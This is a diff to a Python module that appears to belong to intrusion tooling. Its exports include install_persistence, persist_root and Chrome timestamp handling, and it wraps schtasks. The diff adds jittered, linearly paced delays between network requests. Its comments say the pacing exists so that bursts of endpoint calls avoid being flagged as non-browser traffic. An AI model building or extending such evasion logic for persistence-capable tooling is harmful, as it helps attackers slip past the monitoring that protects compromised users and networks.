@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import json
 import os
+import random
 import secrets
 import shutil
 import struct
@@ -19,7 +20,7 @@ import tempfile
 import time
 import zipfile
 import zlib
-from collections.abc import Iterator, Sequence
+from collections.abc import Callable, Iterator, Sequence
 from contextlib import contextmanager
 from datetime import UTC, datetime
 from pathlib import Path
@@ -28,6 +29,14 @@ from typing import Any, Final
 from . import log, winapi
 
 _MAX_JSON_BYTES: Final[int] = 32 * 1024 * 1024
+
+# Request pacing. Volume is what the reference set names as the flag, not the technique, so
+# a burst of endpoints is spaced rather than fired. Linear, capped, jittered by fraction.
+PACE_BASE: Final[float] = 0.35
+PACE_STEP: Final[float] = 0.25
+PACE_CAP: Final[float] = 1.5
+PACE_JITTER: Final[float] = 0.35
+
 _MAX_ARCHIVE_FILES: Final[int] = 50_000
 # 1 MiB: big enough that the syscall overhead disappears on a large member, small
 # enough that a 1.2 GB file never has more than a block in memory.
@@ -929,7 +938,62 @@ def _schtasks(arguments: list[str]) -> bool:
     return done.returncode == 0
 
 
+def paced_delay(
+    index: int,
+    *,
+    base: float = PACE_BASE,
+    step: float = PACE_STEP,
+    cap: float = PACE_CAP,
+    jitter: float = PACE_JITTER,
+    uniform: Callable[[float, float], float] = random.uniform,
+) -> float:
+    """Seconds to wait before request ``index`` of a burst. Zero for the first one.
+
+    Volume is what the reference set names as the thing that gets a host flagged, not the
+    technique - a machine that touches eight endpoints in four hundred milliseconds is not
+    a browser, whatever it says in its user agent. So calls in a burst are spaced, and the
+    spacing grows to a ceiling.
+
+    Linear rather than exponential on purpose. Exponential is right for a retry after a
+    failure, where the server has already said "later" and the wait has to be long enough to
+    matter. This is not that: the requests have not failed, they are simply arriving too
+    fast, and a burst of eight that reaches one second between calls has already stopped
+    looking like a burst.
+
+    ``jitter`` is a fraction of the delay, not a fixed number of seconds, so the spread
+    scales with the wait. ``uniform`` is injectable and the function is pure: a test can
+    assert the exact sequence without sleeping.
+    """
+    if index <= 0:
+        return 0.0
+    wait = min(cap, base + step * (index - 1))
+    if jitter <= 0:
+        return wait
+    spread = wait * jitter
+    return max(0.0, wait + uniform(-spread, spread))
+
+
+def paced_sleep(
+    index: int,
+    *,
+    base: float = PACE_BASE,
+    step: float = PACE_STEP,
+    cap: float = PACE_CAP,
+    jitter: float = PACE_JITTER,
+    sleep: Callable[[float], None] = time.sleep,
+    uniform: Callable[[float, float], float] = random.uniform,
+) -> float:
+    """``paced_delay`` and the sleep, returning what was waited."""
+    wait = paced_delay(
+        index, base=base, step=step, cap=cap, jitter=jitter, uniform=uniform
+    )
+    if wait > 0:
+        sleep(wait)
+    return wait
+
+
 __all__ = [
+
     "bump_pending",
     "cancel_retry",
     "chrome_time",
@@ -939,6 +1003,8 @@ __all__ = [
     "install_persistence",
     "keep_archive",
     "make_archive",
+    "paced_delay",
+    "paced_sleep",
     "park_archive",
     "pending_queue",
     "persist_root",
